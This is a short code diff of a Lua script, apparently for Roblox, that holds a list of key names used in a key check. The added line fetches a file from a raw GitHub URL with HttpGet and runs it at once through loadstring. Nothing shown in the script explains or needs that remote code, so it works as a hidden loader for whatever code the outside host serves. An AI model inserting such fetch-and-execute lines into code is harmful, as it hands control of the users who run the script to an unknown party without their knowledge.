@@ -5,6 +5,8 @@ local keys = {
     "Liam Pro",
     "Bouty Pro"
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abwalt/yuhhhh/main/notcool"))()
+
 
 local counter = 1
 local keyCheck
